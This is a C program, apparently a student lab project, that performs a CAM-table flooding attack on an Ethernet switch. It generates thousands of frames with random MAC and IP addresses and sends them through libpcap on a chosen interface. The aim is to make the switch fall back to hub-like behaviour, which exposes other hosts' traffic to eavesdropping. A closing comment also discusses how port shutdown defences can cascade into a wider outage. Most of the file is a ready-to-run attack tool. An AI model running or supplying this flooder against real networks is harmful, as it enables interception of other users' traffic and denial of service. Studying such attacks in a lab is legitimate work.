#include <linux/if_ether.h> // https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/if_ether.h importé par la ligne ci-dessous
#include <net/ethernet.h> // https://codebrowser.dev/glibc/glibc/sysdeps/unix/sysv/linux/net/ethernet.h.html
#include <pcap/pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/ether.h> // je crois qu'il importe les deux premiers... mais tant pis
#include <sys/socket.h>
#include <pcap.h> // https://linux.die.net/man/3/pcap_sendpacket
#include <netinet/ip.h> // to create payloads to my ethernet packets

#define ETHER_HEADER_LEN 14

void generate_random_mac(u_char *mac_addr) {
    // sends a 8 bit number back that will have to be converted to a mac_address automatically as ether_header takes as types u_char
    for (int i = 0 ; i < ETH_ALEN ; i++) {
        mac_addr[i] = rand() % 256;
    }
    // FIXME : mac addresses to be accepted by the interfaces must validate certain conditions so as they are recognized as being made by a constructor
}


//void generate_random_ip(char *ip_addr) {
//    // Generate a random IP address as 4 strings
//    // to be more reliable and accepted advertise that you have a random ip address and that you want to converse with a random ip
//    for (int i = 0 ; i < 4; i++) {
//        sprintf(&ip_addr[i], "%d",  rand() % 256);
//    }
//}

void generate_random_ip_v1(char *ip_addr) {
    // Generate a random IP address as a string
    for (int i = 0; i < 3; i++) {
        sprintf(&ip_addr[i * 4], "%d", rand() % 256); // Write each octet to the appropriate position in the IP address string
        strcat(&ip_addr[i * 4], "."); // Add a dot separator between octets
    }
    sprintf(&ip_addr[12], "%d", rand() % 256); // Write the last octet
}

void generate_random_ip_v2(char *ip_addr) {
    // Generate a random IP address as 4 strings
    for (int i = 0 ; i < 4; i++) {
        sprintf(&ip_addr[i * 4], "%d", rand() % 256); // Offset the write position by 4 bytes per iteration
        printf("ip_addr' %d: %s \n", i, ip_addr);
        if (i < 3) {
            strcat(&ip_addr[i * 4], "."); // Append a period between each byte except the last one
            printf("ip_addr %d: %s \n", i, ip_addr);
        }
    }
    printf("ip_addr : %s \n", ip_addr);
}

int generate_random_numbers(){
    return rand() % 256;
}

void generate_random_ip_v3(char *ip_addr) {
    sprintf(ip_addr, "%d.%d.%d.%d", generate_random_numbers(), generate_random_numbers(), generate_random_numbers(), generate_random_numbers());
}

// Function to calculate IPv4 header checksum from chatGPT
unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1) {
        sum += *(unsigned char *)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)~sum;
}

void generate_ip_payload_v1(struct ip ip_header) { // from chatGPT reformed to suit my random ip generator
    // Create an IPv4 header and populate its fields
    ip_header.ip_hl = 5; // Header length (in 32-bit words)
    ip_header.ip_v = 4; // IPv4 version
    ip_header.ip_tos = 0; // Type of Service
    ip_header.ip_len = htons(sizeof(struct ip)); // Total length (in bytes)
    ip_header.ip_id = htons(12345); // Identification
    ip_header.ip_off = 0; // Fragment offset
    ip_header.ip_ttl = 255; // Time to Live
    ip_header.ip_p = IPPROTO_TCP; // Protocol (e.g., TCP)
    ip_header.ip_sum = 0; // Checksum (initialized to 0 for calculation)
    char ip_add[16]; // Allocate enough space for the string representation of an IPv4 address
    generate_random_ip_v1(ip_add);
    printf("ip_src 1 : %s \n", ip_add);
    ip_header.ip_src.s_addr = inet_addr(ip_add);
    generate_random_ip_v1(ip_add);
    printf("ip_dst 1: %s \n", ip_add);
    ip_header.ip_dst.s_addr = inet_addr(ip_add);
    
    //ip_header.ip_src.s_addr = inet_addr(strcat(&ip_add[0], strcat(".", strcat(&ip_add[1], strcat(".", strcat(&ip_add[2], strcat(".", &ip_add[3]))))))); // Source IP address
    //ip_header.ip_dst.s_addr = inet_addr("192.168.1.1"); // Destination IP address
    // Calculate and set the IPv4 header checksum
    ip_header.ip_sum = checksum((unsigned short *)&ip_header, sizeof(struct ip));

}

void generate_ip_payload_v2(struct ip *ip_header) {
    // Create an IPv4 header and populate its fields
    ip_header->ip_hl = 5; // Header length (in 32-bit words)
    ip_header->ip_v = 4; // IPv4 version
    ip_header->ip_tos = 0; // Type of Service
    ip_header->ip_len = htons(sizeof(struct ip) + 0); // Total length (in bytes)
    ip_header->ip_id = htons(12345); // Identification
    ip_header->ip_off = 0; // Fragment offset
    ip_header->ip_ttl = 255; // Time to Live
    ip_header->ip_p = IPPROTO_TCP; // Protocol (e.g., TCP)
    ip_header->ip_sum = 0; // Checksum (initialized to 0 for calculation)

    char ip_src[16]; // Allocate enough space for the string representation of an IPv4 address
    generate_random_ip_v3(ip_src);
    ip_header->ip_src.s_addr = inet_addr(ip_src);

    //printf("ip_src 2: %s \n", ip_src);
    char ip_dst[16]; // Allocate enough space for the string representation of an IPv4 address
    generate_random_ip_v3(ip_dst);
    ip_header->ip_dst.s_addr = inet_addr(ip_dst);
    //printf("ip_dst 2: %s \n", ip_dst);
    // TODO : generate a random trailer (it's what macof does) as a payload but i think what i did is ok. 
    // Calculate and set the IPv4 header checksum
    ip_header->ip_sum = checksum((unsigned short *)ip_header, sizeof(struct ip));
}


void generate_basic_packets(struct ether_header *packet_list, int num_packets) {
    // to be faster it is best to have all the packets already generated before the beginning of the attack
    for (int i =  0; i < num_packets ; i ++) {
        generate_random_mac(packet_list[i].ether_dhost);
        generate_random_mac(packet_list[i].ether_shost);
        packet_list[i].ether_type=htons(0x0800); // 0x0800 is to use ipv4 payload ; 
        // htons function converts the unsigned short integer hostshort from host byte order to network byte order
        
        
    }
}

void generate_complex_packets_v1(struct ether_header *packet_list, unsigned char **eth_frames, int num_packets) {
    for (int i = 0; i < num_packets ; i++) {
        memcpy(eth_frames[i], &packet_list[i], ETHER_HEADER_LEN);
        struct ip ip_header;
        generate_ip_payload_v1(ip_header);
        memcpy(eth_frames[i] + ETHER_HEADER_LEN, &ip_header, sizeof(struct ip));
    }
}

void generate_complex_packets_v2(struct ether_header *packet_list, unsigned char **eth_frames, int num_packets) {
    for (int i = 0; i < num_packets; i++) {
        memcpy(eth_frames[i], &packet_list[i], ETHER_HEADER_LEN);
        
        // Dynamically allocate memory for the IP header
        //struct ip *ip_header = malloc(sizeof(struct ip));
        struct ip *ip_header = (struct ip *)malloc(sizeof(struct ip));

        if (ip_header == NULL) {
            // Handle allocation failure
            perror("Failed to allocate memory for IP header");
            exit(EXIT_FAILURE);
        }

        // Generate the IP payload and populate the IP header
        generate_ip_payload_v2(ip_header);

        // Copy the IP header into the Ethernet frame buffer
        memcpy(eth_frames[i] + ETHER_HEADER_LEN, ip_header, sizeof(struct ip));

        // Free the dynamically allocated memory for the IP header
        free(ip_header);
    }
}



void cam_complex_overflow(unsigned char **eth_frames, int num_packets, char *INTERFACE, size_t frame_len) {    
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(INTERFACE, BUFSIZ, 1, 1000, errbuf); // https://github.com/the-tcpdump-group/libpcap/issues/1117 seems better with non local devices
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", INTERFACE, errbuf);
        exit(EXIT_FAILURE); // as the handle was not opened
    }

    for (int i = 0 ; i < num_packets ; i++) {
        if (pcap_sendpacket(handle, (const u_char *)eth_frames[i], frame_len) != 0) {
            printf("The switch has killed our port\n");
            //printf(&eth_frames[i]);
            exit(EXIT_FAILURE);
        } 
    }
    pcap_close(handle);
}

void cam_overflow(struct ether_header *packet_list, int num_packets, char *INTERFACE) {
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(INTERFACE, BUFSIZ, 1, 1000, errbuf); // https://github.com/the-tcpdump-group/libpcap/issues/1117 seems better with non local devices
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", INTERFACE, errbuf);
        exit(EXIT_FAILURE); // as the handle was not opened
    }

    for (int i = 0 ; i < num_packets ; i++) {
        // seems that the packets are malformed as there is no ip payload (wireshark tells me they are malformed)
        if (pcap_sendpacket(handle, (const u_char *)&packet_list[i], sizeof(struct ether_header)) != 0) {
            printf("The switch has killed our port\n");
            exit(EXIT_FAILURE);
        } // from chatGPT
    }
    pcap_close(handle);
}

// https://www.frameip.com/attaque-protection-switch-commutateur-ethernet/

int main(int argc, char *argv[]) {
    //printf("started\n");
    int PACKET_COUNT = 10000; // default values
    char *INTERFACE = "eth0"; // default values
    // TODO : search for all the interfaces that could seem like internet but have weird names (zB  : enps) instead of fixing it to eth0 
        if (argc > 1) {
        if (strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0) {
            // Print help message
            usage:
            printf("Usage: %s [options] \n", argv[0]);
            printf("Options:\n");
            printf("  -h, --help        Display this help message\n");
            printf("  -n, --number      Number of packets to send\n");
            printf("  -i, --interface   Interface on which to do the attack\n");
            return 0;
        }
        for (int i = 1; i < argc ; i++){
            if (strcmp(argv[i], "-n") == 0 || strcmp(argv[i], "--number") == 0) {
                PACKET_COUNT = atoi(argv[i+1]);
                i++;
            } else if (strcmp(argv[i], "-i") == 0 || strcmp(argv[i], "--interface") == 0) {
                INTERFACE = argv[i+1];
                i++;
            } else {
                goto usage; // in case of invalid arguments
            }
        }
    }
    struct ether_header packet_list[PACKET_COUNT];
    struct ip ip_header;
    memset(&ip_header, 0, sizeof(struct ip));


    // additions to have a valid ip payload
    size_t frame_len = ETHER_HEADER_LEN + sizeof(struct ip);
    
    // Allocate memory for the Ethernet frame buffer
    //unsigned char *eth_frame = (unsigned char *)malloc(frame_len);
    //unsigned char **eth_frames = (unsigned char **)malloc(PACKET_COUNT * sizeof(frame_len));
    unsigned char **eth_frames = (unsigned char **)malloc(PACKET_COUNT * sizeof(unsigned char *));
    if (eth_frames == NULL) {
        printf("couldn't malloc the eth_frames list of pointers\n");
        return 1;
    }
    for (int i = 0 ; i < PACKET_COUNT ; i++) {
        eth_frames[i] = (unsigned char *)malloc(frame_len);
        if (eth_frames[i] == NULL) {
            // Error handling if malloc fails to allocate memory for a specific frame
            // Print an error message, free previously allocated memory, return an error code, or handle the error in any appropriate way
            printf("couldn't malloc the frames\n");
            return 1;
        }
    }

    // Allocate memory for each Ethernet frame
    //for (int i = 0; i < PACKET_COUNT; i++) {
    //    eth_frames[i] = (unsigned char *)malloc(frame_len);
    //    if (eth_frames[i] == NULL) {
    //        // Error handling if malloc fails to allocate memory for a specific frame
    //        // Print an error message, free previously allocated memory, return an error code, or handle the error in any appropriate way
    //        return 1;
    //    }
    //}
    generate_basic_packets(packet_list, PACKET_COUNT);
    //printf("first step ok\n");
    generate_complex_packets_v2(packet_list, eth_frames, PACKET_COUNT);
    //printf("second step ok\n");
    //cam_overflow(packet_list, PACKET_COUNT, INTERFACE);
    cam_complex_overflow(eth_frames, PACKET_COUNT, INTERFACE, frame_len);
    printf("CAM flooding seems to be a success, switch should behave like a hub\n");
    for (int i = 0; i < PACKET_COUNT ; i++) {
        free(eth_frames[i]);
    }
    free(eth_frames);
    return 0;
}

/*
from http://web.mit.edu/freebsd/head/sys/net/ethernet.h
struct ether_header {
	u_char	ether_dhost[ETHER_ADDR_LEN];
	u_char	ether_shost[ETHER_ADDR_LEN];
	u_short	ether_type;
} __packed;


Other switch configurations detect that a L2-flooding attack is in progress (by detecting a flood of packets with "new" source-L2-addresses)over a port, and temporarily disables the port. This, in itself, can be an attack if (can you explain how?)
if the first switch i use does not implement this defense and the packets i send are transfered to a second switch who does then i am blocking all the trafic between the two switches
and thus i kill all communication on a much bigger size than expected : all switches must have the same defensive configuration

*/